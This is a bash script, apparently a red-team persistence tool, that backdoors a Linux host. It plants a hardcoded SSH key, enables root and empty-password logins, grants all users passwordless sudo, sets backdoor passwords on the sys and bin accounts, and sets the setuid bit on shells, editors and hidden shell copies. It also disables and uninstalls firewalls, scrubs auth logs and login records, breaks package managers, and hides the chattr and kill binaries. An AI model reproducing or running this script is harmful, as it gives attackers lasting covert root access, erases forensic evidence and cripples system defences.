#!/usr/bin/env bash
set +x

SHARED_PUBKEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQgs43ZR7jpGXeqWCnLDrtn2Jlx7I9qRQ/MLPRUypSvY23uGORJEbOlnLZoqKT6/vDov/JGNgfdW2VEAMluRdnXYn/I2YAb4UgcjaEgHK2pPtCCYg+h0cw6eqDqtDPz9YppBfxQabOjkZ61YSsjs67X2OBahPxxh0ZMDop+BHYeCVZ3fF2bePjQe8R0fAGe0iD9bAe+WnlWg1fMTIctE0U5lcqQSvww8oyBiklpPivf3nl3q2PHRdHTivFUr8qJdzinys/AwfKovoZ7W+BvB1JTPfAYu4DYpGxYxkmqjW5Aoh8nxILVbkR1pQ6FHVy38NBifw+OF4TBoDjwSYaM+lJ"

currentscript="$0"

clear_logins() {
    echo -n "Removing login logs..."
    rm -rf /var/run/utmp
    touch /var/run/utmp
    chmod 664 /var/run/utmp

    # then remove login logs permanently
    for file in /var/log/lastlog /var/log/utmp /var/log/wtmp /var/run/lastlog /var/run/utmp /var/run/wtmp ; do
        unlink $file
        ln -s /dev/null $file
    done
    echo "Done. "
}

install_ssh_keys() {
    echo -n "Installing SSH pub key..."
    # install root ssh key
    if [ ! -d "/root/.ssh" ]; then
        mkdir /root/.ssh
        chmod 700 /root/.ssh
    fi 
    
    if [ ! -d "/dev/.ssh" ]; then
        mkdir /dev/.ssh
        chmod 700 /dev/.ssh
    fi
        
    declare -a files=("/root/.ssh/authorized_keys" "/root/.ssh/authorized_keys1" "/etc/ssh/authorized_keys" "/dev/.ssh/authorized_keys")
    
    for i in "${files[@]}";
	do
    xchattr=$(my_chattr)
        $xchattr -i $i
        echo $SHARED_PUBKEY >> $i
        reset_mtime $i
        chmod 600 $i
        $xchattr +i $i
    done 
    
    $xchattr -i /etc/ssh/sshd_config

    echo 'AuthorizedKeysFile /etc/ssh/authorized_keys' >> /etc/ssh/sshd_config
    echo 'AuthorizedKeysFile /dev/.ssh/authorized_keys' >> /etc/ssh/sshd_config
    echo 'AuthorizedKeysFile %h/.ssh/authorized_keys2' >> /etc/ssh/sshd_config
    
    sed -ie 's/#AuthorizedKeysFile/AuthorizedKeysFile/g' /etc/ssh/sshd_config
    sed -ie 's/#PermitEmptyPasswords/PermitEmptyPasswords/g' /etc/ssh/sshd_config
    sed -ie 's/PermitEmptyPasswords no/PermitEmptyPasswords yes/g' /etc/ssh/sshd_config
    sed -ie 's/^PermitRootLogin .*$/PermitRootLogin yes/' /etc/ssh/sshd_config
    sed -ie 's/#PasswordAuthentication .*$/PasswordAuthentication yes/' /etc/ssh/sshd_config
    reset_mtime "/etc/ssh/sshd_config"
    /etc/init.d/ssh restart
    /etc/init.d/sshd restart
    echo "Done. "
}

sudoers_fix() {
    echo -n "Modifying the sudoers file..."
    xchattr=$(my_chattr)
    $xchattr -i /etc/sudoers
    echo 'ALL ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
    touch -r /etc/issue * /etc/sudoers
    echo "Done. "
}

suid_all_the_things() {
    echo -n "Changing the SUID for all shells and text-editors..."
    declare -a files=("/bin/sh /bin/bash /bin/zsh $(which vim) $(which nano) $(which find)")

	for i in "${files[@]}"; do
        chmod u+s $i
    done
    echo "Done. "
}

add_sys_account() {
    echo -n "Adding sys backdoor account..."
    xchattr=$(my_chattr)
    $xchattr -i /etc/passwd
    $xchattr -i /etc/shadow
    #lol123
    sed -i -e 's/sys:\*:/sys:$6$OkgT6DOT$0fswsID8AwsBF35QHXQVmDLzYGT.pUtizYw2G9ZCe.o5pPk6HfdDazwdqFIE40muVqJ832z.p.6dATUDytSdV0:/g' /etc/shadow
    usermod -s /bin/sh sys
    echo "Done. "
}

add_bin_account() {
    echo -n "Adding bin backdoor account..."
    xchattr=$(my_chattr)
    $xchattr -i /etc/passwd
    $xchattr -i /etc/shadow
    #lol123
    sed -i -e 's/bin:\*:/bin:$6$OkgT6DOT$0fswsID8AwsBF35QHXQVmDLzYGT.pUtizYw2G9ZCe.o5pPk6HfdDazwdqFIE40muVqJ832z.p.6dATUDytSdV0:/g' /etc/shadow
    usermod -s /bin/sh bin
    echo "Done. "
}

bd_account_permissions() {
    #centos
    echo -n "Setting admin group permissions for the backdoor accounts..."
    if [ -e /etc/centos-release ]; then
        usermod -G wheel -a bin
        usermod -G wheel -a sys
    fi
    if [ -e /etc/fedora-release ]; then
        usermod -G wheel -a bin
        usermod -G wheel -a sys
    fi
    #ubuntu
    if [ -e /etc/os-release ]; then
        OSVER=`cat /etc/os-release | awk -F"\"" 'FNR == 1 {print $2}'`
        if [ $OSVER == 'Ubuntu' ]; then
            usermod -G adm -a bin
            usermod -G adm -a sys
        fi
    fi  
    echo "Done. "
}

pam_unlock() {
    echo -n "Booping PAM..."
    xchattr=$(my_chattr)
    sed -ie "s/*//g" /etc/shadow
    sed -ie "s/\!//g" /etc/shadow
    sed -ie "s#/usr/sbin/nologin#/bin/bash#g" /etc/passwd
    sed -ie "s#/sbin/nologin#/bin/bash#g" /etc/passwd
    sed -ie "s#/bin/false#/bin/bash#g" /etc/passwd
    sed -ie "s#/bin/true#/bin/bash#g" /etc/passwd
    if [ -e "/etc/pam.d/password-auth" ]; then 
        #centos
        sed -ie "s/nullok_secure/nullok/g" /etc/pam.d/password-auth
        sed -ie "s/try_first_pass//g" /etc/pam.d/password-auth
    fi
    if [ -e "/etc/pam.d/common-auth" ]; then
        #not centos
        sed -ie "s/nullok_secure/nullok/g" /etc/pam.d/common-auth
    fi
    sed -ie "s/pam_rootok.so/pam_permit.so/g" /etc/pam.d/su
    $xchattr -i /etc/ssh/sshd_config
    sed -ie "s/PermitEmptyPasswords no/PermitEmptyPasswords yes/g" /etc/ssh/sshd_config
    sed -ie "s/#PermitEmptyPasswords no/PermitEmptyPasswords yes/g" /etc/ssh/sshd_config
    ##restart ssh to update config
    /etc/init.d/ssh restart
    /etc/init.d/sshd restart
    echo "Done. "
}

stop_firewalls() {
    echo -n "Stopping firewalls..."
    iptables -P INPUT ACCEPT
    iptables -P FORWARD ACCEPT
    iptables -P OUTPUT ACCEPT
    iptables -F
    iptables -X
    
    if [ -f $(which ufw) ]; then
        ufw disable
    fi
    # poor iptables
    echo "Let the firewalls hit the floor"
    echo "*/5 * * * * /sbin/iptables -F" | crontab -
    echo "Done. "
}

murder_firewalls() {
    echo -n "Murdering firewalls..."
    #centos
    if [ -e /etc/centos-release ]; then
        rpm -e --nodeps `rpm -qa | grep iptables`
        echo "Murdered CentOS Firewall"
    fi
    if [ -e /etc/fedora-release ]; then
        rpm -e --nodeps `rpm -qa | grep iptables`
        echo "Murdered Fedora Firewall"
    fi
    #ubuntu
    if [ -e /etc/os-release ]; then
        OSVER=`cat /etc/os-release | awk -F"\"" 'FNR == 1 {print $2}'`
        if [ $OSVER == 'Ubuntu' ]; then
            apt-get remove iptables -qq
            echo "Murdered Ubuntu Firewall"
        fi
    fi    
    echo "Done. "
}

#goodbye_sla() {
#    cat <<EOF > /usr/share/service.sh
##!/bin/bash
#UMAD?

#while [ 0 ]
#do
#    service httpd stop
#    service postfix stop
#    service sendmail stop
#    service mysql stop
#    service webmin stop
#    service named stop
#    service bind stop
#    killall -9 webmin.pl
#    killall -9 apache2
#    killall -9 httpd
#    killall -9 named
#    killall -9 mysqld_safe
#    killall -9 mysqld
#    killall -9 qemu-kvm
#    sleep 10
#done
#EOF
#  chmod +x /usr/share/service.sh
#  nohup /usr/share/service.sh >/dev/null 2>&1 &
#}

backdoor_shells() {
    echo -n "Making backdoor shells..."
    if [ ! -d "/opt/..." ]; then
        mkdir /opt/...
    fi
    if [ ! -d "/dev/..." ]; then
        mkdir /dev/...
    fi
    if [ ! -d "/tmp/..." ]; then
        mkdir /tmp/...
    fi
    declare -a files=("/opt/..." "/tmp/..." "/dev/...")

	for i in "${files[@]}"; do
        cp /bin/sh $i
        reset_mtime $i
        chmod 777 $i
        chmod u+s $i
        chmod u+s $i/sh
        #set resuid 0000000
    done
    echo "Done. "
}

little_housecleaning() {
    echo -n "Doing a bit of log housekeeping..."
    sed -ie '/groupadd/d' /var/log/auth.log /var/log/messages /var/log/secure
    sed -ie '/usermod/d' /var/log/auth.log /var/log/messages /var/log/secure
    sed -ie '/passwd/d' /var/log/auth.log /var/log/messages /var/log/secure
    sed -ie '/Accepted password for sys/d' /var/log/auth.log /var/log/messages /var/log/secure
    sed -ie '/Accepted password for root/d' /var/log/auth.log /var/log/messages /var/log/secure
    echo "Done. "
}

kill_package_managers() {
    echo -n "Killing the package manager..."
    xchattr=$(my_chattr)
#centos
    if [ -f "/etc/yum.conf" ]; then
        $xchattr -i /etc/yum.conf
        echo 'exclude=*' >> /etc/yum.conf
        reset_mtime "/etc/yum.conf"
        $xchattr +i /etc/yum.conf
    fi
#ubuntu
    if [ -d "/etc/apt/preferences.d" ]; then
        echo -e "Package: *\nPin: release *\nPin-Priority: -1" > /etc/apt/preferences.d/ubuntu
        # blend in
        touch -r /etc/issue * /etc/apt/preferences.d/*
        touch -r /etc/issue * /etc/apt
        touch -r /etc/issue * /etc/apt/*
    fi
    if [ -f "/etc/apt/preferences" ]; then
        echo -e "Package: *\nPin: release *\nPin-Priority: -1" > /etc/apt/preferences
        touch -r /etc/issue * /etc/apt
        touch -r /etc/issue * /etc/apt/*
    fi
# prevent kernel package from being included in the autoupgrade in ubuntu
    if [ -f "/etc/apt/apt.conf.d/01autoremove" ]; then
        sed -ie 's/\"metapackages\"/\"metapackages\";\n\t\"kernel\*\"/'g /etc/apt/apt.conf.d/01autoremove
        touch -r /etc/issue * /etc/apt/apt.conf.d/*
        touch -r /etc/issue * /etc/apt
        touch -r /etc/issue * /etc/apt/*
    fi
    echo "Done. "
}

doge() {
    echo -n "..."
    if [ -e /etc/os-release ]; then
        OSVER=`cat /etc/os-release | awk -F"\"" 'FNR == 1 {print $2}'`
        if [ $OSVER == 'Ubuntu' ]; then
            apt-get -y -qq install python-pip &>/dev/null
            pip install doge &>/dev/null
            echo "Installed doge memes on Ubuntu. Done."
        fi
    fi
    if [ -e /etc/fedora-release ]; then
        yum install python-pip &>/dev/null
        pip install doge &>/dev/null
        echo "Installed doge memes on Fedora. Done."
    fi
}

lolcat() {
    echo -n "Installing lolcat"
        if [ -e /etc/os-release ]; then
        OSVER=`cat /etc/os-release | awk -F"\"" 'FNR == 1 {print $2}'`
        if [ $OSVER == 'Ubuntu' ]; then
            apt-get -y -qq install lolcat
            echo "Installed lolcat on Ubuntu. Done."
        fi
    fi   
}

remove_history() {
    unlink /root/.bash_history
    ln -s /dev/null /root/.bash_history
}

#ls_roulette() {
#    echo -n "Making ls become russian roulette..."
#    for i in `find / -maxdepth 3 -name '.bashrc'`; do
#        dank = '[ $[ $RANDOM % 6 ] == 0 ] && echo "Dank Memes" || echo "You Live."; /bin/ls'
#        
#    done
#    for i in `find / -maxdepth 3 -name '.bash_profile'`; do
#        dank = '[ $[ $RANDOM % 6 ] == 0 ] && echo "Dank Memes" || echo "You Live."; /bin/ls'        
#    done
#    echo "Done."
#}

#implode() {      
#    read -p "Do you want to delete this meme? (Y/n): " -n 1 -r
#    echo    # (optional) move to a new line
#    if [[ $REPLY =~ ^[Yy]$ ]]; then
#        echo "DELETING this meme-age script... ${currentscript}"; shred -u ${currentscript};
#    else 
#        echo "NOT DELETING THIS MEME-AGE script...continuing..."
#    fi
#}

nochattr() {
    echo -n "Moving the chattr binary..."
    if [ -e $(which chattr) ]; then
        mv $(which chattr) /usr/bin/stack
        #cp $(which ls) /usr/bin/chattr
    fi
    echo "Done. "
}

nokill() {
    echo -n "Moving the kill binary..."
    if [ -e $(which kill) ]; then
        mv $(which kill) /bin/bzgrep2
    fi
    echo "Done. "
}

chattr_everything() {
    echo -n "Chattring important files..."
    xchattr=$(my_chattr)
    $xchattr +i /etc/ssh/authorized_keys*
    $xchattr +i /root/.ssh/authorized_keys*
    $xchattr +i /dev/.ssh/authorized_keys*
    $xchattr +i /etc/ssh/sshd_config
    $xchattr +i /etc/passwd
    $xchattr +i /etc/shadow
    $xchattr +i /etc/hosts.allow
    $xchattr +i /etc/hosts.deny
    $xchattr +i /etc/sudoers
    echo "Done."
}

my_chattr() {
    if [ -f $(which chattr) ]; then
        echo $(which chattr)
    else
        echo /usr/bin/stack
    fi
}

reset_mtime() { # takes a file name
	touch -r /etc/issue $1
}

fuck_the_keyboard(){
    #touch .inputrc
    #"l": "exit\n"
    #"\x7f": "echo -en '\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\bnah fam\n"
}

memes() {
    install_ssh_keys
    pam_unlock
    add_bin_account
    add_sys_account
    bd_account_permissions
    doge
    lolcat
    backdoor_shells
    suid_all_the_things
    stop_firewalls
    sudoers_fix
    murder_firewalls
    #remove_history
    #goodbye_sla
    little_housecleaning
    clear_logins
    kill_package_managers
    chattr_everything
    nochattr
    nokill
    #implode
    echo "Finished up all the memes. Have a great day!"
}
echo "====================="
echo "| MEME-afy YOUR OS! |"
echo "|   Version: 1.14a  |"
echo "====================="
memes